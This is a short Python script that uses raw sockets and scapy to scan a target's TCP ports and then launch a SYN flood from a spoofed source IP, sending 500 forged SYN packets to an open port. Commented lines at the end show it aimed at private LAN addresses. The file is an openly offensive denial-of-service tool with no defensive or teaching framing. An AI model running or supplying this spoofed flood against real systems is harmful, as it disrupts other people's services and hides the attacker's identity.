# -*- coding: utf-8 -*-
"""
Created on Tue Mar 21 02:36:15 2017

@author: Zha
"""

import socket as socket
from scapy.all import *

class Tcp:
    def __init__(self,spoofIP,targetIP):
        if spoofIP==None or targetIP==None:
            raise ValueError("initialization failed casue by empty input.")
        self.spoofIP=spoofIP
        self.targetIP=targetIP
        
    def scanTarget(self,rangeStart,rangeEnd):
        
        tIP=socket.gethostbyname(self.targetIP)
        sIP=socket.gethostbyname(self.spoofIP)
        
        fp=open('openports.txt','w')
        out=str()
        for x in range(rangeStart,rangeEnd):
            
            current=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            current.settimeout(1)
            action=current.connect_ex((tIP,x))
            print(action,x)
            if action==0:
                out="Port "+str(x)+" is open.\n"
                fp.write(out)
                current.close()
            else:
                pass
        fp.close()
        
    def attackTarget(self,port):
        current=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        current.settimeout(1)
        tIP=socket.gethostbyname(self.targetIP)
        sIP=socket.gethostbyname(self.spoofIP)
        action=current.connect_ex((tIP,port))
        if action==0:
            package=IP(src=sIP,dst=tIP)/TCP(dport=port,flags='S',sport=RandShort())
            for i in range(500):
                send(package)
            return 1
        else:
            
            
            return 0



#a=Tcp('192.168.2.2','192.168.1.95')
#a.scanTarget(1,25)
#b=a.attackTarget(21)
#print(b)
